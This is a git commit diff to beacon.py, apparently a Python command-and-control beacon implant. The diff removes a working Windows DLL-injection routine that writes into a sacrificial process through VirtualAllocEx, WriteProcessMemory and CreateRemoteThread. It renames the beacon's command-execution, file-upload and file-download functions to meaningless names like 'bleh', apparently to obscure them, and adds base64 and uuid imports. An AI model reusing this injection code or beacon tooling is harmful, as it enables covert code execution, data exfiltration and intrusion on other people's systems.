4141f314fc6c5e0dc0730fc3f9f5e1aec0a9fe87
matt-culbert <culbertmatt@gmail.com>
2022-05-21 18:20:44 +0000

    Update beacon.py

--- beacon.py
+++ beacon.py
@@ -1,10 +1,12 @@
 import subprocess
 from subprocess import PIPE
-import sys
-from ctypes import *
+import uuid
 import psutil
 import requests
 import time
+import base64
+
+#time.sleep(10)
 
 
 def get_pid(process_name):
@@ -17,45 +19,7 @@ def get_pid(process_name):
             return proc.pid
 
 
-def dll_inject(dll_path, sacrificial_process='notepad.exe'):
-    """
-    Taken from grayhat Python
-    Adapted for our use
-    Requires a DLL path and a sacrificial_process is optional.
-    If no process name is provided, notepad.exe will be used
-    """
-    notepad = subprocess.Popen([sacrificial_process])  # Start a sacrificial process
-    pid = get_pid(sacrificial_process)
-    PAGE_READWRITE = 0x04
-    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
-    VIRTUAL_MEM = (0x1000 | 0x2000)
-    kernel32 = windll.kernel32
-
-    dll_len = len(dll_path)
-    # Get a handle to the process we are injecting into.
-    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
-    if not h_process:
-        return f"[*] Couldn't acquire a handle to PID: {pid}"
-
-    # Allocate some space for the DLL path
-    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
-    # Write the DLL path into the allocated space
-    written = c_int(0)
-    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))
-    # We need to resolve the address for LoadLibraryA
-    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
-    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
-    # Now we try to create the remote thread, with the entry point set
-    # to LoadLibraryA and a pointer to the DLL path as its single parameter
-    thread_id = c_ulong(0)
-
-    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
-        return "[*] Failed to inject the DLL. Exiting."
-    else:
-        return "[*] Remote thread created."
-
-
-def cmdexe(beacon_command):
+def bleh(beacon_command):
     """
     This takes in a string to execute
     Returns the output if any available
@@ -69,7 +33,7 @@ def cmdexe(beacon_command):
     return out
 
 
-def upload(filePath, url="http://httpbin.org/post"):
+def blehhh(filePath, url="http://httpbin.org/post"):
     '''
     Takes in a URL and filepath
     '''
@@ -78,7 +42,7 @@ def upload(filePath, url="http://httpbin.org/post"):
     status = requests.post(uploadUrl, files={"Files": uploadFile})
 
 
-def dwnld(url, ext):
+def blehhhh(url, ext):
     """
     This takes in a url and ext to download from
     The extension is required for when saving it
